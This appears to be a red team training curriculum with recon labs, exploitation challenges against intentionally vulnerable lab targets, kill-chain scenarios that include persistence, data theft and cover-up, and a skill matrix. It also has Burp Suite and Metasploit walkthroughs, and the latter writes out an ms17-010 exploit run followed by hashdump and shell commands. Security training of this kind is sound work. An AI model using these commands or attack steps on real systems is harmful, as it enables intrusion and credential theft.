# Red Team Training Materials

Comprehensive training resources, labs, challenges, and skill assessments for red team operations.

---

## Beginner Labs

### Lab 1: Basic Reconnaissance
**Objective:** Gather information about a target without direct access

**Skills Covered:**
- OSINT techniques
- Domain enumeration
- Email harvesting
- Technology identification

**Tools:**
- Whois, DNSRecon, TheHarvester
- Shodan, Google Dorks
- LinkedIn, GitHub search

**Exercises:**
1. Find all subdomains for target.com
2. Identify all employees on LinkedIn
3. Discover technology stack via headers
4. Find misconfigured S3 buckets
5. Identify public GitHub repositories

**Success Criteria:**
- [ ] At least 10 subdomains discovered
- [ ] 20+ employees identified
- [ ] Technology stack documented
- [ ] Public buckets found
- [ ] Repository contents analyzed

---

### Lab 2: Network Scanning Basics
**Objective:** Discover and map network resources

**Skills Covered:**
- Port scanning
- Service enumeration
- OS fingerprinting
- Network mapping

**Tools:**
- Nmap, Wireshark
- Masscan, Zenmap

**Exercises:**
1. Scan network range 192.168.1.0/24
2. Identify all open ports on target
3. Determine OS of each host
4. Enumerate running services
5. Create network diagram

**Success Criteria:**
- [ ] All hosts discovered
- [ ] All open ports identified
- [ ] OS correctly determined
- [ ] Services enumerated
- [ ] Network map created

---

### Lab 3: Web Application Discovery
**Objective:** Find and enumerate web application vulnerabilities

**Skills Covered:**
- Web proxy usage
- Parameter discovery
- Application mapping
- Hidden endpoint discovery

**Tools:**
- Burp Suite, OWASP ZAP
- Nikto, Gobuster, Dirbuster

**Exercises:**
1. Map all application endpoints
2. Identify input parameters
3. Discover hidden directories
4. Find admin panels
5. Identify technology stack

**Success Criteria:**
- [ ] All endpoints documented
- [ ] Parameters cataloged
- [ ] Hidden directories found
- [ ] Admin panel located
- [ ] Technology identified

---

## Intermediate Challenges

### Challenge 1: SQL Injection Exploitation
**Objective:** Exploit SQL injection to extract database information

**Target:** DVWA or WebGoat SQL Injection Module

**Tasks:**
1. Identify SQL injection point
2. Determine database type
3. Extract user table
4. Dump user credentials
5. Bypass authentication

**Difficulty:** Medium  
**Estimated Time:** 2-3 hours

---

### Challenge 2: Privilege Escalation
**Objective:** Escalate privileges on compromised Linux system

**Target:** Metasploitable or VulnHub machine

**Tasks:**
1. Initial access (low-privilege user)
2. Enumerate system for escalation vectors
3. Exploit sudo misconfiguration
4. Achieve root access
5. Establish persistence

**Difficulty:** Medium  
**Estimated Time:** 3-4 hours

---

### Challenge 3: Web Application Exploitation
**Objective:** Find and exploit multiple vulnerabilities

**Target:** Damn Vulnerable Web Application (DVWA)

**Tasks:**
1. Identify 5+ vulnerabilities
2. Develop exploit for each
3. Document exploitation steps
4. Demonstrate business impact
5. Propose remediation

**Difficulty:** Medium-High  
**Estimated Time:** 4-6 hours

---

## Advanced Scenarios

### Scenario 1: Internal Network Compromise
**Objective:** Achieve domain admin from low-privilege access

**Setup:**
- Windows domain environment
- Multiple vulnerable systems
- Realistic network segmentation

**Tasks:**
1. Gain initial shell access
2. Escalate to local admin
3. Harvest domain credentials
4. Kerberoasting attack
5. Domain admin compromise
6. Establish persistence
7. Extract sensitive data

**Difficulty:** Advanced  
**Estimated Time:** 8-12 hours  
**Tools:** Metasploit, CrackMapExec, Mimikatz, Impacket

---

### Scenario 2: Full Kill Chain
**Objective:** Complete attack from reconnaissance to persistence

**Phases:**
1. **Reconnaissance (Day 1)**
   - Passive information gathering
   - Technology identification
   - Personnel profiling

2. **Scanning (Day 2)**
   - Active network discovery
   - Vulnerability identification
   - Service enumeration

3. **Exploitation (Day 3-4)**
   - Initial access
   - Privilege escalation
   - Lateral movement

4. **Post-Exploitation (Day 5)**
   - Persistence establishment
   - Data theft
   - Cover-up activities

**Difficulty:** Advanced  
**Estimated Time:** 5 days

---

### Scenario 3: Red vs. Blue Exercise
**Objective:** Attack while defenders detect and respond

**Red Team Tasks:**
- Execute attack without detection
- Establish persistence
- Exfiltrate data
- Maintain access

**Blue Team Tasks:**
- Detect attack
- Respond to alerts
- Contain breach
- Recover systems

**Duration:** 2-3 days  
**Difficulty:** Advanced  
**Team Size:** 4-8 per team

---

## Skill Assessment Matrix

### Reconnaissance Skills

| Skill | Beginner | Intermediate | Advanced |
|-------|----------|--------------|----------|
| OSINT | Information gathering | Analysis and correlation | Intelligence fusion |
| Network mapping | Basic scanning | Large-scale scanning | Infrastructure profiling |
| Web discovery | Manual testing | Automated scanning | Advanced enumeration |

### Exploitation Skills

| Skill | Beginner | Intermediate | Advanced |
|-------|----------|--------------|----------|
| Vulnerability ID | Known CVEs | Chained exploits | Zero-day development |
| Payload delivery | Basic shells | Multi-stage payloads | AV evasion |
| Privilege escalation | Single vector | Multiple techniques | Complex chains |

### Post-Exploitation Skills

| Skill | Beginner | Intermediate | Advanced |
|-------|----------|--------------|----------|
| Lateral movement | Direct access | Pivot chains | Stealth movement |
| Persistence | Single backdoor | Multiple mechanisms | Rootkit deployment |
| Data theft | File copying | Database extraction | Stealth exfiltration |

---

## Tool Walkthroughs

### Burp Suite Walkthrough

**1. Initial Setup**
```
1. Download and install Burp Community
2. Launch Burp Suite
3. Configure browser proxy (127.0.0.1:8080)
4. Verify traffic capturing
```

**2. Proxy Intercepting**
```
1. Open target website in browser
2. Perform action (login, search, etc.)
3. Observe request in Interceptor
4. Modify request
5. Forward request
6. Observe response
```

**3. Scanner Usage**
```
1. Site map > Target URL
2. New scan > Crawl and Audit
3. Configure scan settings
4. Run scan (takes 10-30 minutes)
5. Review findings by severity
```

**4. Intruder Fuzzing**
```
1. Right-click request > Send to Intruder
2. Positions > Clear and set payload positions
3. Payloads > Select wordlist
4. Start attack
5. Analyze results
```

---

### Metasploit Walkthrough

**1. Starting Metasploit**
```bash
# Launch console
msfconsole

# Search for exploit
search windows/smb

# Select exploit
use exploit/windows/smb/ms17-010
```

**2. Configuring Exploit**
```
show options
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
show options  # Verify
```

**3. Running Exploit**
```
exploit
[*] Meterpreter session opened

meterpreter > sysinfo
meterpreter > hashdump
meterpreter > shell
```

---

## Checklist for Skill Progression

### Beginner Goals
- [ ] Understand attack phases
- [ ] Use basic reconnaissance tools
- [ ] Perform simple scans
- [ ] Run basic Metasploit exploits
- [ ] Document findings clearly

### Intermediate Goals
- [ ] Identify multiple exploitation paths
- [ ] Exploit web vulnerabilities
- [ ] Escalate privileges
- [ ] Perform lateral movement
- [ ] Develop custom payloads

### Advanced Goals
- [ ] Execute complete kill chains
- [ ] Evade detection systems
- [ ] Develop zero-day exploits
- [ ] Create custom tools
- [ ] Lead red team operations

---

## Recommended Training Path

**Month 1:** Fundamentals
- Week 1-2: OSINT and reconnaissance
- Week 3-4: Network scanning and enumeration

**Month 2:** Exploitation Basics
- Week 1-2: Web application vulnerabilities
- Week 3-4: Remote code execution

**Month 3:** Advanced Exploitation
- Week 1-2: Privilege escalation
- Week 3-4: Lateral movement and persistence

**Month 4:** Red Team Operations
- Week 1-2: Full kill chain exercises
- Week 3-4: Red vs. Blue scenario

---

## Useful Resources

- **HackTheBox:** https://www.hackthebox.eu/
- **TryHackMe:** https://www.tryhackme.com/
- **OWASP WebGoat:** Secure coding learning
- **PortSwigger Academy:** Web security training
- **Pentester Academy:** Comprehensive courses
- **PTES:** Penetration testing framework
- **MITRE ATT&CK:** Technique reference

---

**Last Updated:** 2026  
**Maintained by:** Red Team Documentation
